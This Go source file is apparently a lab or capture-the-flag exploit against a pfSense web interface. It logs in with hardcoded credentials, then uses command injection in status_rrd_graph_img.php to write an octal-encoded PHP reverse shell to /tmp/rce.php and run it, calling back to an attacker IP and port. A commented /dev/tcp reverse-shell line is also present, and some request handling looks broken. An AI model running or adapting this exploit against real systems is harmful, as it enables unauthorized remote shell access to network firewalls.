package main

import (
	"fmt"
	"net/http"
	"net/url"
	"os/exec"
	"regexp"
	"strings"
)

var filename string = "/tmp/rce.php"

func main() {
	targetURL := "10.10.10.60:443"
	username := "rohit"
	password := "pfsense"
	attackerIP := "10.10.16.6"
	attackerPort := "4444"

	// Step 1: Fetch CSRF token using OpenSSL
	csrfToken, err := getCSRFToken(targetURL)
	if err != nil {
		fmt.Printf("Failed to get CSRF token: %v\n", err)
		return
	}
	fmt.Println("CSRF token obtained:", csrfToken)

	// Step 2: Log in
	cookies, err := login(targetURL, csrfToken, username, password)
	if err != nil {
		fmt.Printf("Login failed: %v\n", err)
		return
	}
	fmt.Println("Login successful!")

	// Step 3: Generate reverse shell payload
	payload := generatePayload(attackerIP, attackerPort)
	fmt.Println("Payload generated")

	// Step 4: Exploit
	err = exploit(targetURL, payload, cookies)
	if err != nil {
		fmt.Printf("Exploit failed: %v\n", err)
		return
	}
	fmt.Println("Exploit completed! Check your listener.")
}

func getCSRFToken(targetURL string) (string, error) {
	// Construct the HTTP request
	request := "GET /index.php HTTP/1.1\r\nHost: 10.10.10.60\r\nConnection: close\r\n\r\n"

	// Use OpenSSL to perform the handshake and send the request
	output, err := executeOpenSSL(targetURL, request)
	if err != nil {
		return "", err
	}

	// Extract the CSRF token from the response
	csrfRegex := regexp.MustCompile(`var csrfMagicToken = "(sid:[a-z0-9,;:]+)";`)
	matches := csrfRegex.FindStringSubmatch(string(output))
	if len(matches) < 2 {
		return "", fmt.Errorf("CSRF token not found")
	}

	return matches[1], nil
}

func login(targetURL, csrfToken, username, password string) ([]*http.Cookie, error) {
	// Construct the login payload
	data := url.Values{}
	data.Set("__csrf_magic", csrfToken)
	data.Set("usernamefld", username)
	data.Set("passwordfld", password)
	data.Set("login", "Login")

	// Construct the HTTP request
	request := fmt.Sprintf(
		"POST /index.php HTTP/1.1\r\nHost: 10.10.10.60\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %d\r\nConnection: close\r\n\r\n%s",
		len(data.Encode()), data.Encode())

	resBytes, err := executeOpenSSL(targetURL, request)
	if err != nil {
		return nil, fmt.Errorf("login failed: %v", err)
	}

	// Parse the response to extract cookies
	response := string(resBytes)
	cookieRegex := regexp.MustCompile(`Set-Cookie: ([^;]+);`)
	matches := cookieRegex.FindAllStringSubmatch(response, -1)

	if len(matches) == 0 {
		return nil, fmt.Errorf("no cookies found in login response")
	}

	// Collect cookies
	var cookies []*http.Cookie
	for _, match := range matches {
		parts := strings.SplitN(match[1], "=", 2)
		cookies = append(cookies, &http.Cookie{
			Name:  parts[0],
			Value: parts[1],
		})
	}

	return cookies, nil
}

func generatePayload(attackerIP, attackerPort string) string {
	// Step 1: Generate the PHP reverse shell payload
	// phpPayload := fmt.Sprintf(`exec("/bin/sh -c 'sh -i >& /dev/tcp/%s/%s 0>&1'");`, attackerIP, attackerPort)
	phpPayload := fmt.Sprintf(`<?php
		$ip = '%s';
		$port = %s;

		$sock = fsockopen($ip, $port);
		exec('/bin/sh -i <&3 >&3 2>&3');
		?>`, attackerIP, attackerPort)

	stager := fmt.Sprintf("echo '<?php %s ?>' > %s", phpPayload, filename)

	// Step 3: Encode the stager in octal format
	octalStager := ""
	for _, char := range stager {
		octalStager += "\\" + fmt.Sprintf("%o", char)
	}

	return octalStager
}

func exploit(targetURL, payload string, cookies []*http.Cookie) error {
	// Step 1: Upload the PHP payload
	uploadRequest := fmt.Sprintf(
		"GET /status_rrd_graph_img.php?database=-throughput.rrd&graph=file|printf '%s' > %s|echo HTTP/1.1\r\nHost: 10.10.10.60\r\nConnection: close\r\n",
		payload, filename)
	uploadRequest += "Cookie: "
	for _, cookie := range cookies {
		uploadRequest += fmt.Sprintf("%s=%s; ", cookie.Name, cookie.Value)
	}
	uploadRequest += "\r\n\r\n"

	// Convert the request to match the exact format needed
	encodedRequest := url.QueryEscape(uploadRequest)
	fmt.Println(encodedRequest)

	_, err := executeOpenSSL(targetURL, encodedRequest)
	if err != nil {
		return fmt.Errorf("failed to upload payload: %v", err)
	}
	fmt.Println("Payload uploaded successfully.")

	// Step 2: Execute the uploaded file
	executeRequest := fmt.Sprintf("GET /status_rrd_graph_img.php?database=-throughput.rrd&graph=file|php %s|echo HTTP/1.1\r\nHost: 10.10.10.60\r\nConnection: close\r\n", filename)
	executeRequest += "Cookie: "
	for _, cookie := range cookies {
		executeRequest += fmt.Sprintf("%s=%s; ", cookie.Name, cookie.Value)
	}
	executeRequest += "\r\n\r\n"

	// Convert the request to match the exact format needed
	encodedRequest = url.QueryEscape(executeRequest)
	fmt.Println(encodedRequest)

	_, err = executeOpenSSL(targetURL, encodedRequest)
	if err != nil {
		return fmt.Errorf("failed to execute payload: %v", err)
	}
	fmt.Println("Payload executed. Check your listener.")

	return nil
}

func executeOpenSSL(targetURL, request string) ([]byte, error) {
	// Use OpenSSL to perform the handshake and send the request
	cmd := exec.Command("openssl", "s_client", "-connect", targetURL, "-quiet")
	stdin, err := cmd.StdinPipe()
	if err != nil {
		return nil, fmt.Errorf("failed to create stdin pipe: %v", err)
	}

	// Write the encoded request to the OpenSSL stdin
	go func() {
		defer stdin.Close()
		// The echo -e behavior: passing the encoded request as is
		_, _ = stdin.Write([]byte(request))
	}()

	// Capture OpenSSL output
	output, err := cmd.CombinedOutput()
	if err != nil {
		return nil, fmt.Errorf("openssl command failed: %v\nOutput: %s", err, string(output))
	}

	return output, nil
}
